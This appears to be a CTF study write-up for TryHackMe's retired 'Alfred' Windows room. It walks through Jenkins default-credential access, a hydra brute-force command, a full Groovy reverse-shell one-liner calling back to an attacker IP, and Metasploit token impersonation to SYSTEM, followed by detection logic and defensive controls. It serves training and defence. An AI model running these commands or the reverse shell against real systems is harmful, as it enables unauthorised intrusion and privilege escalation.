# Alfred — TryHackMe

> **Preparation stub.** Based on publicly documented information about this retired room — not an
> original solve, and no live flag values are recorded. Complete the bracketed fields when working
> the room under your own account. Only document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Alfred |
| Difficulty | Easy |
| Category | Windows |
| Target IP | 10.x.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A Windows host running **Jenkins** with weak/default credentials. The Jenkins **Script Console**
(Groovy) is abused for remote code execution and a reverse shell, then **token impersonation**
(abusing `SeImpersonatePrivilege`) escalates to SYSTEM. Teaches CI/CD exposure and Windows
privilege-token abuse.

## Scenario value (study scaffold)

- **What it tests:** recognising an exposed CI/CD system (Jenkins) as RCE-as-a-feature, and Windows
  privilege escalation via `SeImpersonatePrivilege`.
- **What completing it demonstrates:** web-foothold-to-SYSTEM on Windows — Groovy Script Console RCE
  to a reverse shell, then token impersonation (Incognito / Potato family), and the `whoami /priv`
  discipline (MITRE T1078 → T1059 → T1134.001).

## Key vulnerability class

- **Foothold:** **Jenkins** exposed with weak/default credentials → authenticated **Groovy Script
  Console RCE** (CWE-1188 insecure default / CWE-78 command execution via an admin feature). This is
  a *configuration/exposure* issue, not a single CVE.
- **Privesc:** **token impersonation** via **`SeImpersonatePrivilege`** held by the service account —
  the classic "Potato" family (e.g. Incognito token-stealing / JuicyPotato-style) to obtain a SYSTEM
  token (CWE-269 improper privilege management).

## 1. Reconnaissance

```
nmap -sC -sV -p- -oA nmap/alfred 10.x.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Note |
|------|---------|------|
| 80/tcp | http | Decoy/landing web page |
| 3389/tcp | ms-wbt-server | RDP (often present) |
| 8080/tcp | http (Jetty) | **Jenkins — the foothold** |

[Paste trimmed scan output on completion.]

**nmap flag rationale:**
- `-p-` — all 65,535 TCP ports. Jenkins commonly hides on a non-standard high port; here the
  decoy is port 80 and the real foothold is **8080** — `-p-` is what prevents tunnel vision on 80.
- `-sV` — version detection; the `Jetty` banner on 8080 is the tell that a Jenkins/Java app server
  is present rather than the IIS/Apache the landing page implies.
- `-sC` — default scripts; `http-title` quickly distinguishes the decoy page from the Jenkins app.
- `-oA nmap/alfred` — keep evidence of both web ports.

**What to look for in the scan:** a *second* HTTP service on a high port (8080/Jetty) behind a
bland port-80 landing page. The decoy-plus-real-app pattern is common — always service-scan every
open HTTP port, not just 80/443.

## 2. Enumeration

```
whatweb http://10.x.x.x:8080/
# Browse to :8080 — confirm the Jenkins dashboard / login page
```

- Identify Jenkins on **8080**. Try weak/default credentials first (commonly `admin:admin`); if
  those fail, brute-force the login form:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.x.x.x http-form-post \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid"
```

- [Record the working credential pair (do not publish if reused elsewhere).]

**What to look for after web enumeration:** the **Jenkins version** (footer of any page) and
whether the **Script Console** (`/script`) is reachable once authenticated. Default/weak admin
creds plus a reachable Groovy console *is* the exploit — no CVE hunting needed. If login is locked
down, pivot to checking for an exposed `/script` via an unauthenticated misconfig or a CVE for the
specific Jenkins build.

## 3. Exploitation (Groovy Script Console RCE)

The phases here: authenticate with weak/default creds **[ATT&CK T1078.001 — Valid Accounts:
Default Accounts]** (or brute force, **[ATT&CK T1110.001 — Password Guessing]**), then run Groovy
in the Script Console for code execution **[ATT&CK T1059 — Command and Scripting Interpreter]**.

Navigate to **Manage Jenkins → Script Console** and run a Groovy reverse-shell one-liner. Set up a
listener first (`nc -lvnp 4444`), then:

```groovy
String host="<tun0 ip>";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
};
p.destroy();s.close();
```

- Alternatively host a `msfvenom` Windows payload and pull/execute it from the console.
- **User flag:** `[capture on completion]`

## 4. Privilege escalation (token impersonation)

```
whoami /priv          # look for SeImpersonatePrivilege = Enabled
```

With `SeImpersonatePrivilege` enabled, impersonate SYSTEM **[ATT&CK T1134.001 — Access Token
Manipulation: Token Impersonation/Theft]**. Metasploit Incognito path:

```
# upgrade the shell to meterpreter, then:
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
getuid                # expect NT AUTHORITY\SYSTEM
```

- Non-Metasploit alternative: a Potato-family tool (JuicyPotato / PrintSpoofer depending on Windows
  version) achieves the same SYSTEM escalation.
- **Root/admin flag:** `[capture on completion]` (on this room the root flag sits in the
  Administrator profile and may need `type` over an absolute path).

## 5. Tools used

| Phase | Tools |
|-------|-------|
| Recon | `nmap` (`-sC -sV -p-`) |
| Access | browser, `whatweb`, `hydra` (Jenkins login brute-force) |
| Exploitation | Jenkins Groovy Script Console; `nc`/`msfvenom` reverse shell |
| Privesc | `whoami /priv`; meterpreter `incognito` (`impersonate_token`) / Potato-family tool |

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Valid Accounts: Default Accounts | T1078.001 |
| Credential Access | Brute Force: Password Guessing | T1110.001 |
| Execution | Command and Scripting Interpreter | T1059 |
| Privilege Escalation | Access Token Manipulation: Token Impersonation | T1134.001 |

## 7. Key learnings

- **CI/CD systems are high-value footholds** — an exposed Jenkins with a Script Console is RCE-as-a-
  feature; never expose Jenkins without auth and never leave default creds.
- **`SeImpersonatePrivilege` is a SYSTEM ticket** — service accounts holding it are routinely
  escalated via the Potato/Incognito techniques; always run `whoami /priv` early on Windows.
- **`whoami /priv` first** — privilege enumeration is faster than blind kernel-exploit hunting.
- **Pick the right Potato for the OS build** — JuicyPotato works on older builds; PrintSpoofer/
  RoguePotato cover patched ones. Know which applies before burning time.
- **Blue-team transfer:** MITRE **T1078** (default accounts), **T1059** (scripting), **T1134**
  (token manipulation); detect anomalous Jenkins console use and token-impersonation events.

## 8. Defender perspective — logs & detection

What this attack looks like from a monitored SOC, and the rule that would catch it. (See
[../methodology/ctf-methodology.md §7](../methodology/ctf-methodology.md).)

**Log artefacts generated:**
- **Jenkins audit log** (`jenkins.log` / Audit Trail plugin): repeated failed logins followed by a
  success (the brute force, **T1110.001**), then access to **`/script`** — Script Console use is
  rare and high-privilege; the Audit Trail records the Groovy submission.
- **Windows process telemetry (Sysmon ID 1):** the Jenkins service (`java.exe`/`jenkins.exe`)
  spawning `cmd.exe`/`powershell.exe` — an application server launching a shell is the headline
  indicator (mirrors the Tomcat case in *Jerry*).
- **Token impersonation (T1134.001):** Windows Security **Event ID 4624 logon type 9**
  (`seclogo` / new-credentials) and **4672** (special privileges assigned) appearing for the
  service account, plus **4673/4674** privileged-service calls. Potato-style attacks also generate
  local RPC/named-pipe activity (`SeImpersonate` abuse).
- **Network:** outbound reverse shell from the Jenkins host.

**Example detection logic (Sigma-style):**
```yaml
title: Jenkins Script Console RCE → token impersonation
detection:
  rce:
    ParentImage|endswith: ['\java.exe', '\jenkins.exe']
    Image|endswith: ['\cmd.exe', '\powershell.exe']
  priv:
    EventID: 4672          # special privileges incl. SeImpersonatePrivilege
  condition: rce OR priv
level: high
```

**Why it fires:** legitimate Jenkins almost never spawns an interactive shell, and a service
account suddenly being assigned SYSTEM-equivalent privileges (4672/4624 type 9) is the signature of
token theft. The CI/CD audit log catches the *foothold*, Sysmon + Security log catch the *RCE and
privesc*. Maps to **ATT&CK T1078.001 / T1110.001 / T1059 / T1134.001**.

**Defensive controls:** never expose Jenkins without authentication; remove default credentials and
enforce account lockout; restrict the Script Console to admins on a trusted network; run Jenkins as
a low-privilege account *without* `SeImpersonatePrivilege`; enable the Audit Trail plugin and ship
it to the SIEM.

## Exam relevance — Sec+ SY0-701

| SY0-701 objective | How Alfred makes it concrete |
|-------------------|------------------------------|
| **2.4** Indicators / password attacks | Default credentials (`admin:admin`) on an exposed admin console — the most-tested "you had one job" weakness in Domain 2. |
| **2.3** Vulnerability types | An exposed management interface (Jenkins Script Console) is the "unnecessary service / misconfiguration exposed" vulnerability class. |
| **1.2 / 4.6** AAA & IAM | Windows token impersonation (`incognito`) defeats authentication by stealing an existing identity — the attacker's view of why the exam stresses access tokens and privilege. |
| **5.x** Account / config policy | Changing default credentials and least-privilege service accounts are the governance controls Domain 5 asks about. |

**Interview line:** "Alfred turns the exam's 'change default credentials' bullet into something
visceral — admin:admin on a CI server is full RCE, and the token-impersonation privesc is access
control taught from the attacker's chair."

## 9. References

- Jenkins Script Console RCE technique (configuration exposure, not a single CVE).
- Potato / Incognito `SeImpersonatePrivilege` abuse references; PrintSpoofer.
- MITRE ATT&CK T1078.001, T1110.001, T1059, T1134.001.
